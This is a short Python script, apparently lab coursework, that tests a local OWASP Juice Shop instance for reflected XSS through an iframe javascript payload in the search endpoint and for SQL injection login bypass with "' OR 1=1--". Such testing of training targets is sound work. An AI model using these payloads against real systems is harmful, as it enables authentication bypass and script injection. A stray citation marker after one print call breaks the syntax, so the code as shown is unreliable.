import requests

def test_juiceshop_vulnerabilities(url):
    # Payload para XSS (orientado a Juice Shop)
    xss_payload = '<iframe src="javascript:alert(`xss`)">'
    
    sql_payload = "' OR 1=1--"

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json'
    }

    print(f"--- Iniciando pruebas en: {url} ---")
    try:
        search_url = f"{url}/rest/products/search"
        response_xss = requests.get(search_url, params={'q': xss_payload}, headers=headers)
        
        # Actividad 2: Verificación de reflexión [cite: 153]
        if xss_payload in response_xss.text:
            print(f"[!] XSS Detectado: El payload se refleja en la respuesta.")
        else:
            print(f"[-] XSS no reflejado (Status: {response_xss.status_code})")
    except Exception as e:
        print(f"Error en prueba XSS: {e}")

    # Usamos el endpoint de login que es más sensible en Juice Shop
    try:
        login_url = f"{url}/rest/user/login"
       
        data = {"email": sql_payload, "password": "password123"}
        response_sql = requests.post(login_url, json=data, headers=headers)

        if response_sql.status_code == 200:
            print("[!] SQL Injection Exitosa: ¡Login saltado o bypass de autenticación!")
        elif "SQLITE_ERROR" in response_sql.text or response_sql.status_code == 500:
             print("[!] SQL Injection Detectada: El servidor devolvió un error de base de datos.") [cite: 57]
        else:
            print(f"[-] SQL Injection fallida (Status: {response_sql.status_code})")
            
    except Exception as e:
        print(f"Error en prueba SQL: {e}")

# Ejecución
target = 'http://localhost:3000'
test_juiceshop_vulnerabilities(target)
